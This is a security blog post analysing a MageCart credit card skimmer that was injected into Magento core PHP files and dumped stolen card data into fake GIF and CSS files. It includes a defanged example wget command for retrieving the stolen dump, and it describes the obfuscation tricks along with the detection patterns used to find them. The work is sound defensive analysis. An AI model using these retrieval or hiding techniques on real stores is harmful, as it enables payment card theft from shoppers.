class="entry-container"><div class="entry-content-wrap"><div class="entry-content"><p>MageCart is the name given to the roughly one dozen groups of cyber criminals targeting e-commerce websites with the goal of stealing credit card numbers and selling them on the black market. They remain an ever-growing threat to website owners. We&#8217;ve said many times on this blog that the attackers are constantly using new techniques to evade detection. In this post I will go over a case involving one such <a href="https://sucuri.net/guides/what-is-magecart/" target="_blank" rel="noopener">MageCart</a> group.</p><h2>A Hacked Magento Website</h2><p>Some time ago a client of ours came to us with a heavily infected Magento e-commerce website from where credit card details were being stolen. Our initial actions removed a tremendous amount of malware, including six different types of Magento credit card swipers. The client was stuck in an old version of Magento unable to upgrade for a couple reasons that we will get into later.</p><p>Their version of Magento was nearly 7 years old and missing a plethora of security patches. Sadly this is all too common in the Magento-sphere as it&#8217;s common for business owners to pay a small fortune for a custom coded website and then not have sufficient funds to hire the developer back once their site becomes out-of-date and vulnerable. In fact, it can <a href="https://www.exinent.com/magento-2-0-migration-cost-and-timelines/">cost</a> anywhere from $5,000 to $50,000 to migrate a Magento 1 website (which had its <a href="https://blog.sucuri.net/2019/11/magento-1-end-of-life.html">end of life in 2020</a>) to the more-secure Magento 2. For a lot of website owners this is just not feasible. What&#8217;s worse is that Adobe (the owner of the Magento open-source CMS, likely in their effort to force website owners to upgrade) actually <i>took the security patches for Magento 1 offline.</i> They are still available on Github but not from an official source.</p><h2>Adding Credit Card Details to Image Files</h2><p>One tactic that some Magecart actors employ is the dumping of swiped credit card details into image files on the server avoid raising suspicion. These can later be downloaded using a simple GET request at a later date. For example:</p><pre>wget hxxps://www.compromised-website[.]com/path/to/cc/dump/arrow.gif</pre><p>We have documented how credit card credentials are saved in image files in the past on <a href="https://blog.sucuri.net/2021/03/magento-2-php-credit-card-skimmer-saves-to-jpg.html">this</a> blog.</p><h2>Image Files with base64 Encoded Data</h2><p>Back to the infection: After our initial sweep for malware we noticed that there were two image files on the server that continued to be populated with chunks of base64 encoded data. When decoded to plain text they were clearly credit card and cvv numbers, billing addresses, expiration dates and a lot more. There was something more to be found here.</p><p>The first thing I did was to query the website files for the name of one of the images:</p><pre><i>“arrow.gif”</i></pre><p>That was a pretty basic attempt and I&#8217;m not surprised that didn&#8217;t come up with anything. The attackers stopped leaving their target files in plain text in their payloads a long time ago but I had to try just in case!</p><p>I also tried querying the server for recently modified files but as you can imagine there was a lot of content to go through even after excising the obvious extension updates (especially considering that this was a very large Magento environment).</p><h2>Core File Integrity Check</h2><p>One of our most useful methods in finding new, previously undetected malware strains is a core file integrity check. What this does is it compares the hashes of the core CMS files on the server to known good copies. If there is a mismatch (code or files added, modified or removed) then it&#8217;s worth checking out to see precisely <i>why</i> there is a mismatch. In this case, there was still a tremendous amount of files to go through.</p><p>Fortunately I was pretty sure that this was a PHP injection (rather than javascript) based on how this malware was behaving so I knew to start looking there. Typically with javascript malware you are able to see it loading in the browser or it would show up in an external scan but that was not the case here.</p><p>With Magecart malware the files infected <i>need to be involved in the checkout process somehow in order to work</i>. The attackers can&#8217;t just infect any random file; it has to handle payment information somehow. For this reason we tend to see the same files get infected over and over again. One such file is the following:</p><pre>./app/code/core/Mage/Admin/Model/Session.php</pre><p>I noticed that this file came up in the core integrity check as having been changed from the original. Sure enough, there was our culprit:</p><figure id="attachment_27774" aria-describedby="caption-attachment-27774" style="width: 1233px" class="wp-caption aligncenter"><img decoding="async" class="wp-image-27774 size-full" src="https://blog.sucuri.net/wp-content/uploads/2021/07/image7.png" alt="Some very ugly but cleverly written PHP code using multiple types of obfuscation" width="1233" height="599" srcset="https://blog.sucuri.net/wp-content/uploads/2021/07/image7.png 1233w, https://blog.sucuri.net/wp-content/uploads/2021/07/image7-600x291.png 600w, https://blog.sucuri.net/wp-content/uploads/2021/07/image7-650x316.png 650w, https://blog.sucuri.net/wp-content/uploads/2021/07/image7-768x373.png 768w, https://blog.sucuri.net/wp-content/uploads/2021/07/image7-390x189.png 390w, https://blog.sucuri.net/wp-content/uploads/2021/07/image7-820x398.png 820w, https://blog.sucuri.net/wp-content/uploads/2021/07/image7-1180x573.png 1180w, https://blog.sucuri.net/wp-content/uploads/2021/07/image7-560x272.png 560w, https://blog.sucuri.net/wp-content/uploads/2021/07/image7-80x39.png 80w" sizes="(max-width: 1233px) 100vw, 1233px" /><figcaption id="caption-attachment-27774" class="wp-caption-text">Some very ugly but cleverly written PHP code using multiple types of obfuscation</figcaption></figure><p>Let&#8217;s take apart this malware, shall we?</p><h2>Another Analysis of a Credit Card Swiper</h2><p>The first thing that we are going to want to do is see what we can get out of this big ole&#8217; chunk of code at the top here:</p><p><img loading="lazy" decoding="async" class="aligncenter wp-image-27775 size-full" src="https://blog.sucuri.net/wp-content/uploads/2021/07/image1.png" alt="Base 64 encoded string" width="1180" height="272" srcset="https://blog.sucuri.net/wp-content/uploads/2021/07/image1.png 1180w, https://blog.sucuri.net/wp-content/uploads/2021/07/image1-600x138.png 600w, https://blog.sucuri.net/wp-content/uploads/2021/07/image1-650x150.png 650w, https://blog.sucuri.net/wp-content/uploads/2021/07/image1-768x177.png 768w, https://blog.sucuri.net/wp-content/uploads/2021/07/image1-390x90.png 390w, https://blog.sucuri.net/wp-content/uploads/2021/07/image1-820x189.png 820w, https://blog.sucuri.net/wp-content/uploads/2021/07/image1-560x129.png 560w, https://blog.sucuri.net/wp-content/uploads/2021/07/image1-80x18.png 80w" sizes="auto, (max-width: 1180px) 100vw, 1180px" /></p><p>This is likely where the meat and potatoes of our malware is. First thing&#8217;s first: this looks like a base64 encoded string, so let’s try to decode it and see what we get:</p><figure id="attachment_27776" aria-describedby="caption-attachment-27776" style="width: 912px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" class="wp-image-27776 size-full" src="https://blog.sucuri.net/wp-content/uploads/2021/07/image5.png" alt="Decoding base64 string" width="912" height="697" srcset="https://blog.sucuri.net/wp-content/uploads/2021/07/image5.png 912w, https://blog.sucuri.net/wp-content/uploads/2021/07/image5-600x459.png 600w, https://blog.sucuri.net/wp-content/uploads/2021/07/image5-650x497.png 650w, https://blog.sucuri.net/wp-content/uploads/2021/07/image5-768x587.png 768w, https://blog.sucuri.net/wp-content/uploads/2021/07/image5-390x298.png 390w, https://blog.sucuri.net/wp-content/uploads/2021/07/image5-820x627.png 820w, https://blog.sucuri.net/wp-content/uploads/2021/07/image5-560x428.png 560w, https://blog.sucuri.net/wp-content/uploads/2021/07/image5-80x61.png 80w" sizes="auto, (max-width: 912px) 100vw, 912px" /><figcaption id="caption-attachment-27776" class="wp-caption-text">Complete rubbish</figcaption></figure><p>Well, that&#8217;s not very useful is it? Another popular method of encoding data alongside base64 is <i>gzinflate.</i> Once we added that function to the decoding process and echoed out the results in a safe, sandbox environment we got the following:</p><figure id="attachment_27778" aria-describedby="caption-attachment-27778" style="width: 708px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" class="wp-image-27778 size-full" src="https://blog.sucuri.net/wp-content/uploads/2021/07/image4.png" alt="Decoded results" width="708" height="245" srcset="https://blog.sucuri.net/wp-content/uploads/2021/07/image4.png 708w, https://blog.sucuri.net/wp-content/uploads/2021/07/image4-600x208.png 600w, https://blog.sucuri.net/wp-content/uploads/2021/07/image4-650x225.png 650w, https://blog.sucuri.net/wp-content/uploads/2021/07/image4-390x135.png 390w, https://blog.sucuri.net/wp-content/uploads/2021/07/image4-560x194.png 560w, https://blog.sucuri.net/wp-content/uploads/2021/07/image4-80x28.png 80w" sizes="auto, (max-width: 708px) 100vw, 708px" /><figcaption id="caption-attachment-27778" class="wp-caption-text">Ok, now we&#8217;re getting somewhere!</figcaption></figure><p>This at least gives us something that uses normal letters and numbers that could be typed on a keyboard if you felt so inclined. One distinct thing I notice about this is that it starts with two equals signs. In base64 encoding these equals signs always occur at the <i>end</i> of the sample, <i>not the beginning.</i> So let&#8217;s go ahead and reverse the string and then run that through a base64 decoder again:</p><p><img loading="lazy" decoding="async" class="aligncenter wp-image-27779 size-full" src="https://blog.sucuri.net/wp-content/uploads/2021/07/image6.png" alt="arrow.gif" width="1238" height="551" srcset="https://blog.sucuri.net/wp-content/uploads/2021/07/image6.png 1238w, https://blog.sucuri.net/wp-content/uploads/2021/07/image6-600x267.png 600w, https://blog.sucuri.net/wp-content/uploads/2021/07/image6-650x289.png 650w, https://blog.sucuri.net/wp-content/uploads/2021/07/image6-768x342.png 768w, https://blog.sucuri.net/wp-content/uploads/2021/07/image6-390x174.png 390w, https://blog.sucuri.net/wp-content/uploads/2021/07/image6-820x365.png 820w, https://blog.sucuri.net/wp-content/uploads/2021/07/image6-1180x525.png 1180w, https://blog.sucuri.net/wp-content/uploads/2021/07/image6-560x249.png 560w, https://blog.sucuri.net/wp-content/uploads/2021/07/image6-80x36.png 80w" sizes="auto, (max-width: 1238px) 100vw, 1238px" /></p><p>Bingo! There&#8217;s our arrow.gif at the bottom.</p><p>However, that tells only part of the story. What about this part of the infection?</p><p><img loading="lazy" decoding="async" class="aligncenter wp-image-27780 size-full" src="https://blog.sucuri.net/wp-content/uploads/2021/07/image2.png" alt="base 64 malware" width="1191" height="194" srcset="https://blog.sucuri.net/wp-content/uploads/2021/07/image2.png 1191w, https://blog.sucuri.net/wp-content/uploads/2021/07/image2-600x98.png 600w, https://blog.sucuri.net/wp-content/uploads/2021/07/image2-650x106.png 650w, https://blog.sucuri.net/wp-content/uploads/2021/07/image2-768x125.png 768w, https://blog.sucuri.net/wp-content/uploads/2021/07/image2-390x64.png 390w, https://blog.sucuri.net/wp-content/uploads/2021/07/image2-820x134.png 820w, https://blog.sucuri.net/wp-content/uploads/2021/07/image2-1180x192.png 1180w, https://blog.sucuri.net/wp-content/uploads/2021/07/image2-560x91.png 560w, https://blog.sucuri.net/wp-content/uploads/2021/07/image2-80x13.png 80w" sizes="auto, (max-width: 1191px) 100vw, 1191px" /></p><p>This is the part of the code from which the title of this article was derived. The attackers are using what&#8217;s called &#8220;concatenation&#8221; here, which is a very common obfuscation technique that we see a lot. Normally it looks something like this:</p><pre>&lt;?php echo ""."h"."e"."".""."llo"."w"."o"."".""."r"."l"."d"."";</pre><p>Whereas the server would interpret that as simply &#8220;helloworld&#8221;.</p><h2>Hiding Malware with Comment Chunks</h2><p>We already know to look for this type of obfuscation and the attackers know this. In this case they have added some additional comment chunks (the grey areas in the above image). That part of the code does not <i>functionally</i> do anything but it adds a layer of obfuscation making it somewhat more difficult to detect. So when we would do our normal check for concatenated code and search for something like:</p><pre>"."".""."</pre><p>It would return nothing.</p><p>Let&#8217;s use a simple regular expression to remove those useless comment chunks and see what we get. We are going to use the following regex for that:</p><pre>'\/\*\w+\*\/.'</pre><p>The result is as follows:</p><p><img loading="lazy" decoding="async" class="aligncenter wp-image-27781 size-full" src="https://blog.sucuri.net/wp-content/uploads/2021/07/image8.png" alt="Malware snippet" width="1212" height="87" srcset="https://blog.sucuri.net/wp-content/uploads/2021/07/image8.png 1212w, https://blog.sucuri.net/wp-content/uploads/2021/07/image8-600x43.png 600w, https://blog.sucuri.net/wp-content/uploads/2021/07/image8-650x47.png 650w, https://blog.sucuri.net/wp-content/uploads/2021/07/image8-768x55.png 768w, https://blog.sucuri.net/wp-content/uploads/2021/07/image8-390x28.png 390w, https://blog.sucuri.net/wp-content/uploads/2021/07/image8-820x59.png 820w, https://blog.sucuri.net/wp-content/uploads/2021/07/image8-1180x85.png 1180w, https://blog.sucuri.net/wp-content/uploads/2021/07/image8-560x40.png 560w, https://blog.sucuri.net/wp-content/uploads/2021/07/image8-80x6.png 80w" sizes="auto, (max-width: 1212px) 100vw, 1212px" /></p><p>Still encoded, but no longer concatenated. We can see that it is further using the eval base_64decode function to further obfuscate what it is doing but this is the part of the code where the randomly named variables are stored.</p><h2>Next Steps on the Magecart Swiper Journey</h2><p>This solved only half of our puzzle as there was still another image file present on the server that was getting base64 encoded credit card details dumped into it. There must be something else to find!</p><p>Borrowing an old technique I used back in <a href="https://blog.sucuri.net/2019/08/neapolitan-backdoor-injection.html">2019</a> to find a series of backdoors (fifteen variations on one website to be precise) I decided to query the file system for some &#8220;<i>micropatterns</i>&#8221; that might yield some more results. If this Session.php file used this type of concatenation, maybe the attacks were using the same patterns in another file?</p><p>The winning query was as follows:</p><pre>*/.'_'/*</pre><p>This is a weird series of special characters unlikely to be present in a normal file. It also avoids relying on the randomly generated junk populating the concatenated commented-out chunks and instead focuses on the concatenation itself. Sure enough, here it was:</p><pre>./app/code/core/Mage/Bundle/Model/Observer.php</pre><figure id="attachment_27782" aria-describedby="caption-attachment-27782" style="width: 1233px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" class="wp-image-27782 size-full" src="https://blog.sucuri.net/wp-content/uploads/2021/07/image3.png" alt="Malware snippet 2" width="1233" height="754" srcset="https://blog.sucuri.net/wp-content/uploads/2021/07/image3.png 1233w, https://blog.sucuri.net/wp-content/uploads/2021/07/image3-600x367.png 600w, https://blog.sucuri.net/wp-content/uploads/2021/07/image3-650x397.png 650w, https://blog.sucuri.net/wp-content/uploads/2021/07/image3-768x470.png 768w, https://blog.sucuri.net/wp-content/uploads/2021/07/image3-390x238.png 390w, https://blog.sucuri.net/wp-content/uploads/2021/07/image3-820x501.png 820w, https://blog.sucuri.net/wp-content/uploads/2021/07/image3-1180x722.png 1180w, https://blog.sucuri.net/wp-content/uploads/2021/07/image3-560x342.png 560w, https://blog.sucuri.net/wp-content/uploads/2021/07/image3-80x49.png 80w" sizes="auto, (max-width: 1233px) 100vw, 1233px" /><figcaption id="caption-attachment-27782" class="wp-caption-text">That&#8217;s the tea!</figcaption></figure><p>There we have it! It has the same patterns to the file, same encoding types, just slightly different content, and this time writing to a following bogus css file:</p><pre>./skin/install/default/default/css/default.css</pre><p>The advantage for this type of infection for the attackers is that the stolen credit card details can still be obtained with a simple GET request by downloading the bogus file even after they have been locked out of the server due to a simple password change or something similar.</p><h2>In Conclusion</h2><p>MageCart is an ever growing threat to e-commerce websites. From the perspective of the attackers: the rewards are too large and consequences non-existent, why wouldn&#8217;t they? Literal fortunes are made stealing and selling stolen credit cards on the black market. In fact, fascinatingly, the black market functions much like the legitimate market: software developers sell exploit kits to those who want to profit off of compromising websites. Telephone, chat and email support is provided to those customers aiming to exploit vulnerable websites for a profit. Once the stolen credit card details are exfiltrated they are sold on the black market to illicit consumers for a profit.</p><p>As more and more commerce is conducted online we can only expect the attacks on websites to escalate and more players enter the already-crowded field of MageCart. The fact that it&#8217;s not uncommon for us to see an infected website with multiple different credit card swipers present on them seems to suggest that vulnerable websites are being targeted by multiple different groups all at the same time.</p><p>The company RiskIQ in their outstanding <a href="https://www.riskiq.com/resources/research/inside-magecart/">report</a> on Magecart shows a great sort of taxonomy of those engaged in these credit card theft cases. At the time of writing it there were roughly 7 distinct groups engaging in swiping credit card details from unsuspecting websites. Although attribution in the website security world is always challenging (or impossible) the example above looks to be the distinct work of Group number 7. Since that report was issued quite a few more groups have entered the game, including one (possibly Canadian?) recently <a href="https://lukeleal.com/research/posts/magento2-angrybeaver-skimmer/">documented</a> making for what is currently a crowded threat landscape.</p><p>One point to note is that it&#8217;s not only groups that carry out these kinds of attacks, there are also individuals on this landscape which makes the actual number of actors in this landscape quite high and impossible to predict.</p><h2>How do I protect my website?</h2><p>This boils down to some core principles that we have been stating on this blog for a very long time:</p><ol><li aria-level="1">Keep your website up to date and install all software updates as soon as you can</li><li aria-level="1">Use long, complex passwords</li><li aria-level="1">Use secure workstations to administer your website</li><li aria-level="1">Use a secure hosting environment</li><li aria-level="1">Lock down your administration panel with additional safeguards</li><li aria-level="1">Put your website behind a <a href="https://sucuri.net/website-firewall/">firewall</a> to prevent attacks</li></ol><p>Websites are very complicated things and can become compromised in many different ways. We have always recommended <a href="https://blog.sucuri.net/2016/10/accounting-for-defense-in-depth-in-website-security.html">defence in depth</a>. Expect the worst but hope for the best! Every hard drive can fail, every database can crash, every security rule in place can be breached or broken. The goal should be to have as many security rules in place as possible; if one fails, others can still succeed and it doesn&#8217;t come down to a single point of failure. This doesn&#8217;t make for a convenient website administration experience but it&#8217;s better than suffering the <a href="https://www.ftc.gov/tips-advice/business-center/guidance/data-breach-response-guide-business">consequences</a> of a compromise!</p><p><a href="https://info.sucuri.net/subscribe-to-security" target="_blank" rel="noopener">Stay tuned</a> for more website security content!</p><p>&nbsp;</p><p>&nbsp;</p></div><div class="post-author"><div class="author-wrap"><div class="author"><div class="author-avatar"> <a href="https://blog.sucuri.net/author/benmartin" rel="author"> <img alt='' src='https://secure.gravatar.com/avatar/fcf2c7b3195ff9058d29af3b8a49fc43?s=120&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/fcf2c7b3195ff9058d29af3b8a49fc43?s=240&#038;d=mm&#038;r=g 2x' class='avatar avatar-120 photo' height='120' width='120' loading='lazy' decoding='async'/> </a></div><div class="author-description"><h5 class="title-author"> <span class="fn"> <a href="https://blog.sucuri.net/author/benmartin" rel="author"> Ben Martin </a> </span></h5><p class="note">Ben Martin is a security analyst and researcher who joined the company in 2013.
